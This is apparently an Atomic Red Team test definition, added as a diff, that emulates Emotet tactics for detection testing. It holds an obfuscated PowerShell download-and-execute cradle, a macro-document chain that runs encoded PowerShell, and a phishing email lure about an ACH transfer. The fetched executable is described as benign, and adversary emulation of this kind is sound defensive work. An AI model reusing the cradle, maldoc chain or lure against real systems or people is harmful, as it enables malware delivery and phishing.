@@ -1,0 +1,163 @@
+attack_technique: emotet
+display_name: Emotet TTPs
+atomic_tests:
+-   name: Chained Emotet - Maldoc Macro > Powershell Encoded Command > Benign Executable
+    auto_generated_guid:
+    description: |
+        Creates a new Word Document with a macro to execute a base64-encoded PowerShell code.
+
+        Upon successful build and execution, powershell will execute an encoded command and download a benign executable that will launch cmd.exe and powershell.exe to check public IP and if google.com is accessible
+    supported_platforms:
+    -   windows
+    input_arguments:
+        ms_office_version:
+            description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+            type: String
+            default: '16.0'
+        executable_name:
+            description: Name of the final executable powershell will start
+            type: String
+            default: Finevrt.exe
+        download_url:
+            description: Where to download the executable
+            type: Url
+            default: https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1204.002/bin/168.exe
+        executable_location:
+            description: Where to save the downloaded executable
+            type: String
+            default: $env:temp\
+        cyborg_atomics_folder:
+            description: Folder containing the Red Canary default Atomics (With sub-techniques)
+            type: String
+            default: C:\AtomicRedTeam\Cyborg\atomics\
+    dependency_executor_name: powershell
+    dependencies:
+    -   description: |
+            Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
+        prereq_command: |
+            If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+            $msword = New-Object -ComObject word.application
+            Stop-Process -Name WINWORD
+    executor:
+        command: |
+            $InputVars = @{ "ms_product" = "Word"; "ms_office_version" = "#{ms_office_version}"; "executable_name" = "#{executable_name}"; "download_url" = "#{download_url}"; "executable_location" = "#{executable_location}" }
+            Invoke-AtomicTest T1566.001 -TestName "Chained - Maldoc > Powershell Encoded Command > Executable Download > Run Executable" -InputArgs $InputVars -PathToAtomics #{cyborg_atomics_folder}
+        cleanup_command: |
+            $InputVars = @{ "ms_product" = "Word"; "ms_office_version" = "#{ms_office_version}"; "executable_name" = "#{executable_name}"; "download_url" = "#{download_url}"; "executable_location" = "#{executable_location}" }
+            Invoke-AtomicTest T1566.001 -TestName "Chained - Maldoc > Powershell Encoded Command > Executable Download > Run Executable" -InputArgs $InputVars -PathToAtomics #{cyborg_atomics_folder} -Cleanup
+        name: powershell
+-   name: Emotet Encoded Commands
+    auto_generated_guid:
+    description: |
+        Runs a neutered Emotet PowerShell command that will download a benign file and execute it
+
+        Upon successful execution, powershell will execute the benign executable which will spawn cmd.exe and powershell.exe to get the hosts public IP and ping google.com for connectivity tests.
+    supported_platforms:
+    -   windows
+    input_arguments:
+        powershell_command:
+            description: |
+                Command that will be encoded and executed. Escaping: Single Quotes '', Double Quotes `", Backtick ```, Variable `$. 
+            type: String
+            default: |
+                `$Efmhroliwkln=''Ildyveontpnm'';`$Synevykd = ''F4j71fg'';`$Bgvjrfrei=''Halxrenwvkvm'';`$Ylljwqqfjtii=`$env:temp+''\''+`$Synevykd+''.exe'';`$Erlxueltbvdpd=''Rhvkaxnbvy'';`$Jxsohaqzhfn=.(''new-obj''+''e''+''ct'') net.WeBcLIent;`$Hkwcjzwaf=''http://www.github.com/cyborgsecurity/emotet/*http://www.github.com/cyborgsecurity/emotet1/*http://www.github.com/cyborgsecurity/emotet2/*http://www.github.com/cyborgsecurity/emotet3/*https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1204.002/bin/168.exe''.`"SpL```iT`"(''*'');`$Gwvfunlmofhnj=''Yqtbbtkddac'';foreach(`$Dexxvcsflrwc in `$Hkwcjzwaf){try{`$Jxsohaqzhfn.`"dOw```NlOAd```FiLE`"(`$Dexxvcsflrwc, `$Ylljwqqfjtii);`$Rppyleew=''Jcshxlahbqj'';If ((&(''G''+''et-It''+''em'') `$Ylljwqqfjtii).`"lE```NGtH`" -ge 25) {[Diagnostics.Process]::`"s```TART`"(`$Ylljwqqfjtii);`$Whgwtsfs=''Vyqiceeqsa'';break;`$Ilmrcsarrcenc=''Idnjrxhmzvsfx''}}catch{}}`$Vkrxzukbpnrn=''Ucfxfwnfrsba''
+        default_atomics_folder:
+            description: Folder containing the Red Canary default Atomics (With sub-techniques)
+            type: String
+            default: C:\AtomicRedTeam\atomics\
+    executor:
+        command: |
+            $InputVars = @{ "powershell_command" = "#{powershell_command}" }
+            Invoke-AtomicTest T1027 -TestName "Execute base64-encoded PowerShell" -InputArgs $InputVars -PathToAtomics #{default_atomics_folder}
+        name: powershell
+-   name: Chained Emotet - Email > MSFT Word Attachment > Maldoc Macro > Powershell
+        Encoded Command > Benign Executable Download > Run Executable
+    auto_generated_guid:
+    description: |
+        This is a custom variant of the non custom labeled test. This allows a user to specifically define all aspects of the powershell command, document and email. The test uses a powershell script to generate an VBA code to add to a document, which is then attached to an email. THe email is opened, the document is opened, and the VBA code is executed. The VBA code will execute cmd to launch powershell to download a "first stage" benign malware. The benign executable will launch windows shell, powershell and reach out to api.ipify.org and google.com before exiting.
+
+        Execution is handled by [Invoke-DocPhish](https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1566.001/bin/docPhish.ps1) to load and execute VBA code into Excel or Word documents.
+    supported_platforms:
+    -   windows
+    input_arguments:
+        ms_office_version:
+            description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+            type: String
+            default: '16.0'
+        executable_name:
+            description: Name of the final executable powershell will start (omit
+                extension)
+            type: String
+            default: Panaor
+        download_url:
+            description: Where to download the executable
+            type: Url
+            default: https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1204.002/bin/168.exe
+        executable_location:
+            description: Where to save the downloaded executable
+            type: String
+            default: $env:temp\
+        email_filename:
+            description: What file name for the saved email file (omit extension)
+            type: String
+            default: conf-072320XFR-072020
+        email_recipient:
+            description: Who do you want the email to appear to be sent to (Sender
+                is not currently supported)
+            type: String
+            default: support@example.com
+        email_subject:
+            description: What subject to add to the email
+            type: String
+            default: CONF-072320 XFR-072020 Transfer
+        email_body:
+            description: What text to put into the email body, must be single line
+                with <backtick>r<backtick>n for new lines
+            type: String
+            default: Attached is the last ACH transfer for ```$9,630.76`r`n`r`nSteven
+                Haus`r`n`r`nSupport
+        email_savepath:
+            description: Where should the email be stored. This can be changed to
+                Outlook TEMP folder if desired (Windows 10 - $env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache,
+                Win 7 - $env:USERPROFILE\AppData\Local\Microsoft\Windows\Temporary
+                Internet Files)
+            type: String
+            default: $env:temp
+        doc_savepath:
+            description: Where should the document be stored. This can be changed
+                to Outlook TEMP folder if desired (Windows 10 - $env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache,
+                Win 7 - $env:USERPROFILE\AppData\Local\Microsoft\Windows\Temporary
+                Internet Files)
+            type: String
+            default: $env:USERPROFILE\
+        doc_name:
+            description: Name of the document to attach to the email
+            type: String
+            default: ACH-072020
+        doc_image_location:
+            description: Name of the image to insert into the document
+            type: String
+            default: emotet\src\emotet_docimage.png
+        cyborg_atomics_folder:
+            description: Folder containing the Red Canary default Atomics (With sub-techniques)
+            type: String
+            default: C:\AtomicRedTeam\Cyborg\atomics\
+    dependency_executor_name: powershell
+    dependencies:
+    -   description: |
+            Test Requires MS Office to be installed and have been run previously, with Outlook being closed (Powershell script will check for Outlook running and close if need be). Run -GetPrereqs to run msword and build dependant registry keys
+        prereq_command: |
+            If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+            $msword = New-Object -ComObject word.application
+            Stop-Process -Name WINWORD
+    executor:
+        command: |
+            $PathToImage = Join-Path -Path #{cyborg_atomics_folder} -ChildPath #{doc_image_location}
+            $InputVars = @{ "doc_name" = "#{doc_name}"; "doc_savepath" = "#{doc_savepath}"; "email_filename" = "#{email_filename}"; "email_savepath" = "#{email_savepath}"; "email_recipient" = "#{email_recipient}"; "email_subject" = "#{email_subject}"; "email_body" = "#{email_body}"; "executable_name" = "#{executable_name}"; "executable_location" = "#{executable_location}"; "download_url" = "#{download_url}"; "doc_image_location" = "$PathToImage" }
+            Invoke-AtomicTest T1566.001 -TestName "Chained Custom - Email > Maldoc > Powershell Encoded Command > Executable Download > Run Executable" -InputArgs $InputVars -PathToAtomics #{cyborg_atomics_folder} 
+        cleanup_command: |
+            $InputVars = @{ "doc_name" = "#{doc_name}"; "doc_savepath" = "#{doc_savepath}"; "email_filename" = "#{email_filename}"; "email_savepath" = "#{email_savepath}"; "email_recipient" = "#{email_recipient}"; "email_subject" = "#{email_subject}"; "email_body" = "#{email_body}"; "executable_name" = "#{executable_name}"; "executable_location" = "#{executable_location}"; "download_url" = "#{download_url}"; "doc_image_location" = "#{doc_image_location}" }
+            Invoke-AtomicTest T1566.001 -TestName "Chained Custom - Email > Maldoc > Powershell Encoded Command > Executable Download > Run Executable" -InputArgs $InputVars -PathToAtomics #{cyborg_atomics_folder} -Cleanup
+        name: powershell
